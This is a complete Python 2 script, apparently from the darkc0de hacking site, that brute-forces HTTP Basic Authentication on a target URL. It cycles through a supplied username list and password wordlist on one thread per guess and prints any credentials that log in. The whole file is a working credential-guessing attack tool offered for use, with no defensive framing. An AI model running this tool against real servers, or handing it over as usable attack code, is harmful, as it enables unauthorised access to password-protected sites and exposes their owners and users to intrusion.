#!usr/bin/python
#Pop-up Basic Authentication Brute Forcer
#Not fully tested, encourage feedback.
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, urllib2, socket, httplib
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./webauthbrute.py <server> <userlist> <wordlist>"
	sys.exit(1)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])		
	else:
		print "\nReloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	if len(users) ==1:
		return users[0], value[0][:-1]
	else:
		return users[0][:-1], value[0][:-1] 

def getauth(url):
	
	req = urllib2.Request(url)
	try:
    		handle = urllib2.urlopen(req)
	except IOError, e:                  
    		pass
	else:                               
    		print "This page isn't protected by basic authentication.\n"
    		sys.exit(1)
    
	if not hasattr(e, 'code') or e.code != 401:                 
    		print "\nThis page isn't protected by basic authentication."
    		print 'But we failed for another reason.\n'
    		sys.exit(1)

	authline = e.headers.get('www-authenticate', '')    
          
	if not authline:
    		print '\nA 401 error without an basic authentication response header - very weird.\n'
    		sys.exit(1)
	else:
		return authline
			
class Worker(threading.Thread):
	
	def run(self):
		username, password = getword()
		try:
			print "-"*12
			print "User:",username,"Password:",password
			req = urllib2.Request(sys.argv[1])
			passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
			passman.add_password(None, sys.argv[1], username, password)
			authhandler = urllib2.HTTPBasicAuthHandler(passman)
			opener = urllib2.build_opener(authhandler)
			fd = opener.open(req)
			print "\t\n\nUsername:",username,"Password:",password,"----- Login successful!!!\n\n"			
			print "Retrieved", fd.geturl()
			info = fd.info()
			for key, value in info.items():
    				print "%s = %s" % (key, value)
			sys.exit(2)
		except (urllib2.HTTPError, httplib.BadStatusLine,socket.error), msg: 
			print "An error occurred:", msg
			pass

print "\n\t   d3hydr8[at]gmail[dot]com webauthBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)
print "[+]",getauth(sys.argv[1]),"\n"

for i in range(len(words)*len(users)):
	work = Worker()
	work.setDaemon(1)
	work.start()
	time.sleep(1)
